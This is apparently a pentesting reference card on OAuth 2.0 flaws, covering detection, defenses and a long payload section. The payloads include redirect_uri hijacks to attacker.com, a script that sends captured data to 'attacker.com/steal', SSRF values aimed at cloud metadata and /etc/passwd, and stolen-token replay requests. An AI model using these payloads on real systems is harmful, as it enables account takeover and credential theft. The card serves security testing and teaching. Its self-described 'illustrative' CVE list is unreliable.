# OAuth 2.0 Vulnerabilities

> Misimplemented OAuth flows leak tokens or allow account takeover. **Deep dive:** [`Troubleshooting_Guide/oauth.md`](../../../../Troubleshooting_Guide/oauth.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A07:2021
**Status:** complete

## What it is
OAuth 2.0 vulnerabilities are flaws in how a client application or authorization server
implements the delegated-authorization flow, letting an attacker steal authorization codes or
tokens, or hijack the "log in with X" process. The protocol is sound; the bugs are almost always
in validation and flow handling at the integration points.

## How it works
The attacker controls request parameters in the authorization flow — `redirect_uri`, `state`,
`scope`, `client_id`, and supplied URIs like `logo_uri` — and the client/server validates them
loosely. Weak `redirect_uri` matching sends the authorization code to an attacker host; a missing
or guessable `state` enables CSRF and forced account linking; an open redirect or leaky `Referer`
exfiltrates the code; `id_token` JWTs inherit signature flaws; and PKCE can be downgraded so a
stolen code is redeemable without the verifier. The core mistake is trusting client-supplied
values that gate where secrets are delivered.

## Impact
Account takeover of the victim's account on the relying application, theft of access/refresh
tokens, and access to the scoped resources those tokens grant. SSRF via fetched URIs can reach
cloud metadata and internal services. Severity is typically high to critical, since a successful
attack impersonates the victim end-to-end.

## How to detect
- The provider accepts a modified `redirect_uri` (different host, subdomain, path, or
  `@`/`%2f`/`\` tricks) and still issues a code.
- The flow works with `state` empty, reused, or removed — no CSRF binding.
- Authorization codes appear in `Referer` headers, `postMessage` data, or survive replay after
  logout.
- Registration or metadata endpoints fetch a client-supplied URL (`logo_uri`, `jku`) — probe for
  SSRF.
- `id_token` is a JWT whose `alg` or key handling can be tampered with (see the `jwt` card).

## Exploitation (summary)
Map the provider's endpoints, then test `redirect_uri` validation to redirect the code to an
attacker host. Where `state` is weak, force-link the attacker's social account to the victim or
ride a CSRF. Chain a same-site open redirect or a leaky embedded resource to exfiltrate the code,
replay captured codes/refresh tokens, downgrade PKCE, and abuse `logo_uri` for SSRF. Full payloads
are in the Payloads section below.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Recon: endpoints & parameters
Map the provider before attacking. Common endpoints:

```text
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/.well-known/jwks.json
/auth, /authorization, /oauth/authorize, /connect/authorize
/oauth/token, /connect/token
/callback, /oauth/userinfo, /oauth/revoke
```

Parameters that matter for tampering:

| Parameter | Purpose |
|-----------|---------|
| `client_id` | Application identifier |
| `redirect_uri` | Where the user is sent after auth |
| `response_type` | `code`, `token`, `id_token` |
| `scope` | Permissions requested |
| `state` | CSRF protection token |
| `code_challenge` / `code_verifier` | PKCE challenge / secret |

### Authentication bypass via profile tampering
Intercept the POST to `/authenticate` and substitute the victim's identifier while keeping your own contact field.

```http
POST /authenticate
Content-Type: application/json

{"email":"attacker@evil.com","username":"victim"}
```

### redirect_uri hijacking
Test whether the provider validates `redirect_uri` strictly. Swap the legitimate callback for an attacker host:

```text
https://TARGET/auth?client_id=xxx&redirect_uri=https://attacker.com/callback&response_type=code&state=xxx
```

Domain-validation bypasses and wildcard misconfigurations:

```text
redirect_uri=https://legitimate-domain.attacker.com/
redirect_uri=https://legitimate-domain.com.attacker.com/
redirect_uri=https://target.com.attacker.com/
redirect_uri=https://target.com%2f@attacker.com/
redirect_uri=https://target.com\@attacker.com/
redirect_uri=https://*
redirect_uri=https://*.attacker.com
```

### CSRF / forced account linking
With no (or guessable) `state`, an attacker can bind their social account to the victim's session via a hidden iframe.

```html
<iframe src="https://TARGET/auth?client_id=xxx&scope=openid,email,profile&response_type=code&redirect_uri=https://TARGET/auth/callback&state=ATTACKER_STATE_VALUE&approval_code=REAL_USER_CODE"></iframe>
```

State-parameter weaknesses to probe: empty `&state=` or a known/reused value `&state=known_value`.

### SSRF via logo_uri
If the registration endpoint fetches a client-supplied `logo_uri`, point it inward.

```text
logo_uri=http://169.254.169.254/latest/meta-data/
logo_uri=http://169.254.169.254/latest/user-data/
logo_uri=http://metadata.google.internal/computeMetadata/v1/
logo_uri=http://169.254.169.254/metadata/v1/InstanceAttributes/keys
logo_uri=http://127.0.0.1:8080/admin
logo_uri=http://internal.corp/private/secrets
logo_uri=file:///etc/passwd
logo_uri=file:///C:/Windows/System32/drivers/etc/hosts
```

### Token theft via open redirect
Chain a same-site open redirect onto the OAuth flow so the authorization code lands on the attacker host.

```text
Step 1: POST /authenticate with email change
Step 2: redirect via /post/next?path=https://attacker.com
Result: https://TARGET/post/next?path=https://attacker.com?code=STOLEN_CODE
```

Path-based redirect variants:

```text
/callback/post/redirect?path=//attacker.com
/callback/../redirect?path=//attacker.com
/callback/redirect?path=https://target.com.evil.com
```

### Token leakage via Referer / postMessage
The code can leak through the `Referer` header of an embedded resource, or via a permissive `postMessage` listener.

```html
<img src="https://TARGET/callback?code=LEAKED_CODE" referrerpolicy="no-referrer">
```

```javascript
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(e.data)));
});
// on the OAuth page:
window.parent.postMessage({oauth: window.location.href}, '*');
```

### Mix-up attack (multiple IdP)
Start a flow with a malicious IdP, then feed an attacker-controlled code into the legitimate provider's callback.

```text
GET /auth?response_type=code&client_id=CLIENT_ID&idp=evil
GET /callback?idp=evil&code=ATTACKER_CODE
```

### id_token / JWT algorithm confusion
OAuth identity tokens are JWTs and inherit the same signature flaws. Force `alg:none` (trailing dot, empty signature) or pull the public key and re-sign as HS256.

```text
GET /.well-known/jwks.json
GET /auth/keys
# re-sign the id_token with HS256 using the RSA public key as the HMAC secret
```

### PKCE downgrade
Strip or weaken PKCE so a stolen code can be redeemed without the verifier.

```text
# remove code_challenge and code_challenge_method entirely, or:
code_challenge_method=plain
```

### Token replay, refresh reuse & bearer abuse
Capture an authorization code and replay it after logout, reuse a stolen refresh token, or present a stolen access token directly.

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=CAPTURED_CODE&redirect_uri=https://TARGET/callback&client_id=CLIENT_ID
```

```http
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=CLIENT_ID
```

```http
GET /api/user HTTP/1.1
Host: api.target.com
Authorization: Bearer ATTACKER_ACCESS_TOKEN
```

### State parsing / prototype pollution
If the `state` value is deserialized, test prototype-pollution gadgets.

```text
__proto__[foo]=bar
constructor[prototype][foo]=bar
"__proto__":{"foo":"bar"}
```

## Defenses
1. **Strict `redirect_uri` matching** — exact, pre-registered allow-list with no wildcards or
   partial-path matching; reject anything that does not match exactly.
2. **Mandatory `state`** — cryptographically random, single-use, bound to the user session, and
   verified on callback to stop CSRF and account-linking attacks.
3. **Enforce PKCE** (S256) for all clients, especially public/native; reject `plain` and missing
   challenges.
4. **Protect the code in transit** — short-lived, single-use authorization codes; avoid open
   redirects; set `referrerpolicy`/Referrer-Policy so codes never leak via `Referer`.
5. **Validate `id_token` properly** — pin the algorithm, verify signature, `iss`, `aud`, and
   `nonce` (see the `jwt` card).
6. **Lock down server-fetched URIs** — validate/allow-list `logo_uri`, `jku`, etc., and block
   requests to internal/metadata addresses to prevent SSRF.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=OAuth+2.0+Vulnerabilities
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=OAuth+2.0+Vulnerabilities
- **Exploit-DB** — https://www.exploit-db.com/search?q=OAuth+2.0+Vulnerabilities
- **GitHub Advisories** — https://github.com/advisories?query=OAuth+2.0+Vulnerabilities
- **OSV** — https://osv.dev/list?q=OAuth+2.0+Vulnerabilities
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `OAuth 2.0 Vulnerabilities <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2020-26877` — open-redirect/`redirect_uri` handling enabling OAuth code theft (illustrative of the class).
- `CVE-2022-23607` — Authlib (Python) OAuth flaw in token/redirect handling.
- _Canonical incident: the 2021 Microsoft/GitHub-style "redirect_uri + open redirect" account-takeover chains widely reported on HackerOne._

## References
- PortSwigger Web Security Academy — OAuth 2.0 authentication vulnerabilities.
- OWASP — OAuth 2.0 / OpenID Connect security and the OAuth 2.0 Security Best Current Practice.
- RFC 6749 — OAuth 2.0; RFC 7636 — PKCE; RFC 6819 — OAuth 2.0 Threat Model.
